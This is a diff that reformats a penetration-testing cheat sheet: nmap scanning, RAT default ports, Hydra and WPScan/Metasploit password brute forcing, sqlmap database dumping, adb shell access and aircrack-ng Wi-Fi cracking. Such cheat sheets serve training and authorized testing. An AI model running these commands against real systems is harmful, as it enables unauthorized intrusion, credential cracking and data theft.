@@ -1,9 +1,8 @@
-Host Discovery
-
+ ### Host Discovery ###
 nmap -sn <IP Block>
 netdiscovery -r <IP Block>
-Common Port Scan
 
+### Common Port Scan ###
 nmap -sV -sC -vv -oN 1000Port.txt <IP>
 nmap -A -vv <IP> //aggresive scan 
 
@@ -15,22 +14,21 @@ optional
 -sC : Default script scan
 -v: verbose
 -O : OS Detection
-Default Ports
 
+### Default Ports ###
 Common Services
 FTP:21    SSH:22    Telnet:23    SMTP:25    HTTP:80    HTTPS:443    SMB:139/445        
 RDP:3389    MYSQL:3306    MSSQL:1433    LDAP:389/636/3268/3269    NFS:2049
 
 RAT's Default Ports
 ProRAT:5110    Theef:6703/2968/9871    NjRAT:5552/1177
-Finding Domain Controller and FQDN
 
+### Finding Domain Controller and FQDN ####
 nmap -p389,636,3268,3269 --script ldap-rootdse <IP> // LDAP Service enumaration
-
 FQDN = Hostname+Domain // hostname.domain
-Brute Force
-Hydra
 
+
+#### Brute Force #####
 usage : hydra -l <username> -P <Wordlist Path> <Protocol>://<IP>
 example : hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.12
 
@@ -39,7 +37,8 @@ optional
 -L : username wordlist (/usr/share/wordlists/users.txt)
 -p : spesific password (qwerty,password1)
 -P : password wordlist (/usr/share/wordlists/rockyou.txt)
-Brute Forcing Wordpress Login Pages
+
+### Brute Forcing Wordpress Login Pages ###
 
 Wpscan
 wpscan --url http://10.0.1.55:8080/uri -u root -P passwdfile.txt
@@ -53,10 +52,8 @@ msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_log
        set TARGETURI /uri
        set USERNAME admin
 
-SQL Injection
-
+### SQL Injection
 In alternative we can use SQLMap and the vulnerable url
-
 
 Get all databases using sqlmap
 sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
@@ -69,7 +66,9 @@ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D database_name -T 
 
 Dump the data from the columns 
 sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D database_name -T table_name -C column_name --dump
-Wireshark
+
+### Wireshark ###
+
 Usefull Filters
 
 http.request.method==POST
@@ -82,22 +81,23 @@ or
 `tcp.flags.syn == 1 and tcp.flags.ack == 0` 
 or 
 filter to highest number of request
-Cryptografy
-snow -C -p "password" <target_file>
 
+##### Cryptografy #####
+snow -C -p "password" <target_file>
 openstego
-Mobile Hacking
+
+##### Mobile Hacking #### 
 adb connect <IP>:<PORT>(default port 5555)
 adb shell
 pwd, ls ... basic linux commands
 exit
 adb pull <target_file> .
-WIFI Hacking
+
+#### WIFI Hacking ####
 Crack the wireless encryption and identify the Wi-Fi password
-
 1st tentative:** `aircrack-ng pcapfile` (usually works only for WEP encryption)
-
 2nd tentative**: `aircrack-ng -w passwordlist pcapfile`
-
 3rd tentative**: adding BSSID (-b flag): `aircrack-ng -b BSSID -w passwordlist pcapfile` 
 (To find BSSID: on Wireshark click on packet, search BSSID and copy value)
+
+
